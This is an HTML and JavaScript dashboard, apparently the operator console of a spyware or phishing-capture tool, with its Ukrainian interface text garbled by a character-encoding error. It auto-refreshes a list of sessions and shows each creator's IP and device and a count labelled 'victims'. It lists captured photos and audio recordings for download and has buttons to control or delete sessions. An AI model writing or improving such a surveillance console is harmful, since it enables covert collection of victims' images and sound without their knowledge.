<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SPY MONITORING</title>
    <style>
        body { 
            background: #0a0a0a; color: #00ff99; 
            font-family: 'Courier New', monospace; 
            padding: 20px; margin: 0; 
        }
        .container { max-width: 1200px; margin: 0 auto; }
        
        h1 { 
            text-align: center; color: #00ff99; 
            text-shadow: 0 0 10px #00ff99; margin-bottom: 30px; letter-spacing: 2px;
        }

        .sessions-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); 
            gap: 20px; 
        }

        .session-card { 
            background: #151515; border: 1px solid #333; 
            border-radius: 8px; padding: 15px; position: relative; 
            display: flex; flex-direction: column;
            box-shadow: 0 0 5px rgba(0,0,0,0.5);
            transition: 0.3s;
        }
        .session-card:hover { border-color: #00ff99; box-shadow: 0 0 15px rgba(0, 255, 153, 0.15); }

        .header { 
            display: flex; justify-content: space-between; align-items: center; 
            border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 10px;
        }
        .room-id { font-size: 16px; font-weight: bold; color: #fff; }
        .online-badge { 
            background: #003300; color: #00ff99; padding: 2px 6px; 
            border-radius: 4px; font-size: 11px; border: 1px solid #00ff99;
        }

        .info-row { margin: 4px 0; font-size: 12px; color: #aaa; }
        .info-label { color: #555; font-weight: bold; }
        .highlight { color: #00ff99; }

        /* Files Section */
        .files-section {
            margin-top: 15px; border-top: 1px dashed #444; padding-top: 10px;
            flex-grow: 1; /* –ó–∞–π–º–∞—î –≤—ñ–ª—å–Ω–µ –º—ñ—Å—Ü–µ */
        }
        .files-title { font-size: 11px; font-weight: bold; color: #00aaff; margin-bottom: 5px; text-transform: uppercase; }
        
        .file-list { 
            max-height: 120px; overflow-y: auto; 
            background: #0f0f0f; padding: 5px; border-radius: 4px;
        }
        
        .file-item {
            display: flex; justify-content: space-between; align-items: center;
            background: #1a1a1a; padding: 5px; margin-bottom: 3px; border-radius: 3px;
            font-size: 11px; border: 1px solid #222;
        }
        .file-info { display: flex; flex-direction: column; overflow: hidden; }
        .file-name { color: #ddd; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 180px; }
        .file-date { color: #555; font-size: 9px; }

        .btn-download {
            background: transparent; border: 1px solid #00aaff; color: #00aaff;
            text-decoration: none; padding: 2px 5px; border-radius: 3px; font-size: 9px;
            margin-left: 5px; transition: 0.2s; white-space: nowrap;
        }
        .btn-download:hover { background: #00aaff; color: black; }

        /* Action Buttons */
        .actions { display: flex; gap: 8px; margin-top: 15px; }
        .control-btn, .del-btn {
            flex: 1; padding: 10px; border: none; cursor: pointer; font-weight: bold;
            font-family: inherit; border-radius: 5px; font-size: 11px; transition: 0.2s;
        }
        .control-btn { background: #00ff99; color: black; }
        .control-btn:hover { background: #00cc7a; }
        .del-btn { background: #220000; color: #ff3366; border: 1px solid #550000; }
        .del-btn:hover { background: #ff3366; color: white; border-color: #ff3366; }

        /* Scrollbar */
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #111; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
        
        .no-data { grid-column: 1/-1; text-align: center; padding: 50px; color: #444; border: 1px dashed #333; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üõ∞Ô∏è GLOBAL MONITORING</h1>
        <div id="grid" class="sessions-grid">Waiting for data...</div>
    </div>

    <script>
        async function loadAllSessions() {
            const container = document.getElementById('grid');
            try {
                const res = await fetch('/sessions');
                if (!res.ok) throw new Error("Server error");
                const sessions = await res.json();

                if (sessions.length === 0) {
                    container.innerHTML = '<div class="no-data">–ù–ï–ú–ê–Ñ –ê–ö–¢–ò–í–ù–ò–• –°–ï–°–Ü–ô</div>';
                    return;
                }

                container.innerHTML = '';
                
                sessions.forEach(s => {
                    const isActiveNow = (Date.now() - s.lastActiveAt) < 60000; // –ê–∫—Ç–∏–≤–Ω–∞, —è–∫—â–æ –±—É–ª–∞ –¥—ñ—è –∑–∞ –æ—Å—Ç–∞–Ω–Ω—é —Ö–≤–∏–ª–∏–Ω—É
                    
                    // –û–±'—î–¥–Ω—É—î–º–æ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è —ñ –∑–≤—É–∫–∏ –≤ –æ–¥–∏–Ω —Å–ø–∏—Å–æ–∫ –¥–ª—è –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è
                    const allFiles = [
                        ...s.imagesFiles.map(f => ({...f, icon: 'üì∑'})),
                        ...s.soundsFiles.map(f => ({...f, icon: 'üîä'}))
                    ];

                    let filesHtml = '';
                    if (allFiles.length > 0) {
                        // –°–æ—Ä—Ç—É—î–º–æ: –Ω–æ–≤—ñ —Ñ–∞–π–ª–∏ –∑–≤–µ—Ä—Ö—É
                        allFiles.reverse(); 
                        
                        const listItems = allFiles.map(f => `
                            <div class="file-item">
                                <div class="file-info">
                                    <span class="file-name" title="${f.originalname}">${f.icon} ${f.originalname}</span>
                                    <span class="file-date">${f.uploadedAt}</span>
                                </div>
                                <a href="${f.url}" download="${f.originalname}" target="_blank" class="btn-download">‚¨á –°–ö–ê–ß–ê–¢–ò</a>
                            </div>
                        `).join('');

                        filesHtml = `
                            <div class="files-section">
                                <div class="files-title">üìÇ –§–ê–ô–õ–ò (${allFiles.length}):</div>
                                <div class="file-list">${listItems}</div>
                            </div>
                        `;
                    } else {
                        filesHtml = `
                            <div class="files-section">
                                <div class="files-title">üìÇ –§–ê–ô–õ–ò:</div>
                                <div style="color:#444; font-size:10px; padding:5px;">(–ü–æ—Ä–æ–∂–Ω—å–æ)</div>
                            </div>
                        `;
                    }

                    const card = document.createElement('div');
                    card.className = 'session-card';
                    card.innerHTML = `
                        <div class="header">
                            <span class="room-id">UID: ${s.id.slice(0, 8)}</span>
                            <span class="online-badge">ONLINE: ${s.onlineCount}</span>
                        </div>
                        
                        <div class="info-row"><span class="info-label">–°—Ç–≤–æ—Ä–µ–Ω–æ:</span> ${s.createdAt}</div>
                        <div class="info-row"><span class="info-label">–ê–≤—Ç–æ—Ä IP:</span> ${s.creator.ip}</div>
                        <div class="info-row"><span class="info-label">–î–µ–≤–∞–π—Å:</span> ${s.creator.device}</div>
                        <div class="info-row"><span class="info-label">–ñ–µ—Ä—Ç–≤:</span> <span class="highlight">${s.totalVictims}</span></div>
                        
                        <div class="info-row" style="margin-top:5px;">
                            –°—Ç–∞—Ç—É—Å: ${isActiveNow ? '<span style="color:#00ff99;">‚óè –ê–ö–¢–ò–í–ù–ê</span>' : '<span style="color:#555;">‚óã –°–ü–ò–¢–¨</span>'}
                        </div>

                        ${filesHtml}

                        <div class="actions">
                            <button class="control-btn" onclick="openControl('${s.id}')">üëÅÔ∏è –ö–ï–†–£–í–ê–¢–ò</button>
                            <button class="del-btn" onclick="deleteSession('${s.id}', this)">‚úñ –í–ò–î–ê–õ–ò–¢–ò</button>
                        </div>
                    `;

                    container.appendChild(card);
                });
            } catch (err) {
                console.error(err);
                container.innerHTML = '<div style="color:red; text-align:center;">–ü–æ–º–∏–ª–∫–∞ –∑\'—î–¥–Ω–∞–Ω–Ω—è –∑ —Å–µ—Ä–≤–µ—Ä–æ–º.</div>';
            }
        }

        function openControl(id) {
            // –©–æ–± —É–≤—ñ–π—Ç–∏ –≤ –∞–¥–º—ñ–Ω–∫—É –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó —Å–µ—Å—ñ—ó, –Ω–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–±–µ—Ä–µ–≥—Ç–∏ ID –≤ localStorage
            // –∞–±–æ –ø—Ä–æ—Å—Ç–æ –≤—ñ–¥–∫—Ä–∏—Ç–∏ –∞–¥–º—ñ–Ω–∫—É —ñ –¥–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–≤–µ—Å—Ç–∏ ID.
            // –¢—É—Ç –º–∏ —Å–∫–æ–ø—ñ—é—î–º–æ ID –≤ –±—É—Ñ–µ—Ä —ñ –≤—ñ–¥–∫—Ä–∏—î–º–æ –∞–¥–º—ñ–Ω–∫—É.
            prompt("–°–∫–æ–ø—ñ—é–π ID —Å–µ—Å—ñ—ó —Ç–∞ –≤—Å—Ç–∞–≤ –π–æ–≥–æ –≤ URL (—è–∫—â–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ) –∞–±–æ –≤ –∫–æ–¥:", id);
            window.open(`/admin.html`, '_blank');
        }

        async function deleteSession(id, btn) {
            if (!confirm('–í–∏–¥–∞–ª–∏—Ç–∏ —Å–µ—Å—ñ—é —Ç–∞ –í–°–Ü —ó—ó —Ñ–∞–π–ª–∏? –¶—é –¥—ñ—é –Ω–µ–º–æ–∂–ª–∏–≤–æ —Å–∫–∞—Å—É–≤–∞—Ç–∏.')) return;
            
            const originalText = btn.innerText;
            btn.disabled = true;
            btn.innerText = '...';

            try {
                const res = await fetch(`/session/${id}`, { method: 'DELETE' });
                if (res.ok) {
                    loadAllSessions(); // –û–Ω–æ–≤–ª—é—î–º–æ —Å–ø–∏—Å–æ–∫
                } else {
                    alert('–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –≤–∏–¥–∞–ª–µ–Ω–Ω—ñ.');
                    btn.innerText = originalText;
                    btn.disabled = false;
                }
            } catch (e) {
                alert('–ü–æ–º–∏–ª–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞.');
                btn.innerText = originalText;
                btn.disabled = false;
            }
        }

        // –ê–≤—Ç–æ–æ–Ω–æ–≤–ª–µ–Ω–Ω—è –∫–æ–∂–Ω—ñ 4 —Å–µ–∫—É–Ω–¥–∏
        loadAllSessions();
        setInterval(loadAllSessions, 4000);
    </script>
</body>
</html>
